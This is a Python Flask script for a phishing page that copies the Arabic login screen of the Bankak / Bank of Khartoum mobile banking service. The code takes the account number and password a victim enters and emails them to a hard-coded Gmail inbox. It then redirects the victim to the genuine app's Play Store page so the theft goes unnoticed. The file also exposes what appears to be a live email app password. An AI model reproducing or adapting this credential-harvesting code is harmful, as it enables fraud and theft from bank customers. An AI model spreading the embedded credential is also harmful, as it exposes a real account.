from flask import Flask, render_template_string, request, redirect
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

# قالب HTML المعدل
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تسجيل الدخول</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to bottom, #d50000 61%, white 61%);
            text-align: center;
            margin: 0;
            padding: 0;
        }
        .header {
            padding: 20px;
            color: white;
        }
        .header h1 {
            margin: 0;
            font-size: 3em;
        }
        .header h2 {
            margin: 0;
            font-size: 1.5em;
        }
        .header .green {
            color: green;
        }
        .form-container {
            padding: 55px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            margin: 20px auto;
            position: relative;
        }
        .red-background {
            background-color: #d50000;
            height: 10px;
            border-radius: 10px;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            z-index: -1;
        }
        input[type="text"], input[type="password"], button {
            padding: 10px;
            margin: 10px 0;
            width: calc(100% - 22px);
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 1.2em;
        }
        button {
            background-color: #d50000;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 20px;
        }
        .links {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
            font-size: 1em;
        }
        .footer-icons {
            background-color: white;
            padding: 10px;
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            display: flex;
            justify-content: space-around;
            border-top: 1px solid #ccc;
        }
        .footer-icons img {
            width: 40px;
        }
        .footer-icons p {
            margin: 5px 0 0;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1><span class="green">ب</span>نكك</h1>
        <h2><span class="green">b</span>ankak</h2>
    </div>

    <div class="form-container">
        <div class="red-background"></div>
        <form method="POST">
            <input type="text" id="account_number" name="account_number" placeholder="أدخل رقم الحساب أو رقم الموبايل" required>
            <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
        <div class="links">
            <a href="#">تسجيل جديد؟</a>
            <a href="#">لا تستطيع تسجيل الدخول؟</a>
        </div>
    </div>

    <div class="footer-icons">
        <div class="icon">
            <img src="https://th.bing.com/th/id/R.276502349dd8817470082c5608d35eac?rik=PuOMBctkmo7R2g&pid=ImgRaw&r=0" alt="بنك الخرطوم">
            <p>بنك الخرطوم</p>
        </div>
        <div>
            <img src="https://png.pngtree.com/png-vector/20190419/ourlarge/pngtree-vector-location-icon-png-image_958620.jpg" alt="المساعدة">
            <p>مواقعنا</p>
        </div>
        <div class="icon">
            <img src="https://shoebox.co.uk/wp-content/uploads/2021/05/phone-icon.png" alt="مواقعنا">
            <p>المساعدة</p>
        </div>
        <div class="icon">
            <img src="https://th.bing.com/th/id/OIP.CxN1ZFXY3FBfpfiNDGcdwgAAAA?rs=1&pid=ImgDetMain" alt="فيس بوك">
            <p>فيس بوك</p>
        </div>
    </div>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        account_number = request.form['account_number']
        password = request.form['password']
        
        # هنا يمكنك إضافة منطق للتحقق من الحساب وكلمة المرور
        
        # إرسال المعلومات إلى البريد الإلكتروني
        send_email(account_number, password)
        
        # إعادة توجيه المستخدم إلى الرابط المحدد
        return redirect("https://play.google.com/store/apps/details?id=com.mode.bok.ui")
        
    return render_template_string(HTML_TEMPLATE)

def send_email(account_number, password):
    # إعدادات البريد الإلكتروني
    sender_email = "abdallihabdalazem12@gmail.com"  # بريدك الإلكتروني
    receiver_email = "abdallihabdalazem12@gmail.com"  # البريد الإلكتروني الذي ستستقبل فيه المعلومات
    subject = "معلومات تسجيل الدخول"
    body = f"رقم الحساب: {account_number}\nكلمة المرور: {password}"
    
    # إنشاء رسالة البريد الإلكتروني
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = receiver_email

    # إرسال البريد الإلكتروني
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(sender_email, "pxllassgfqqyejgh")  # كلمة مرور التطبيق هنا
        server.sendmail(sender_email, receiver_email, msg.as_string())

if __name__ == '__main__':
    app.run(debug=True)



